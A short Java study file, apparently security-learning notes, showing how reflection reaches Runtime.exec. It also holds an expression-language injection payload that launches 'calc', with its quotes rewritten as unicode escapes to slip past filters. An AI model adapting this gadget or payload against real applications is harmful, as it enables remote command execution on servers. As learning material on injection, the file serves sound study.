package com.pinger.javasec.reflection;

import java.lang.reflect.Method;

/**
 * @author : p1n93r
 * @date : 2021/11/3 18:11
 */
public class BasicLearn {

    public static void gadget1()throws Exception{

        String test = "";
        Class<?> runTime = test.getClass().forName("java.lang.Runtime");
        Method getRuntimeMethod = runTime.getMethod("getRuntime");
        Runtime runObj = (Runtime)getRuntimeMethod.invoke(null, null);
        runObj.exec("calc");
    }


    public static void testSome()throws Exception{
        String test="{''['class'].forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('calc')}";
        test = test.replaceAll("'","\\\\u0027");
        System.out.println(test);
    }



    public static void main(String[] args)throws Exception {
        testSome();
    }






}
